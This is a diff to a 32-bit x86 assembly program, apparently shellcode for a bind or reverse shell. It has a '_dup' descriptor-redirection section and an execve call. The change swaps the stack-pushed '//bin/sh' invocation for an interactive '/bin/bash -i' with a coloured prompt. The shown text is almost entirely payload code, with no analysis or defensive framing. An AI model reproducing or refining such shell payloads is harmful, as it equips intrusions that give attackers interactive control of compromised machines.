@@ -1,4 +1,11 @@
+ 
 global _start
+section .data
+    SHELL       dw      "/bin/bash", 0
+    arg1        dw      "-i", 0
+    env         dw      "PS1=",34,"\e[0",59,"31m[\u@\h \W]\$ \e[m",34, 0
+    parsearg    dd      SHELL, arg1, 0
+    perseenv    dd      env, 0 
 section .text
 _start:
 
@@ -72,12 +79,7 @@ _dup:
 _exe_bin:
         mov eax, 0xb ;exeve syscall
         ; int execve(const char *pathname, char *const argv[], char *const envp[]);
-        ; push //bin/sh dans la stack
-        xor ebx, ebx
-        push ebx        	;Null
-        push 0x68732f6e		;hs/n : 68732f6e
-        push 0x69622f2f 	;ib// : 69622f2f
-        mov ebx, esp
-        xor ecx, ecx
-        xor edx, edx
+        mov ebx, SHELL
+        mov ecx, parsearg
+        mov edx, perseenv
         int 0x80
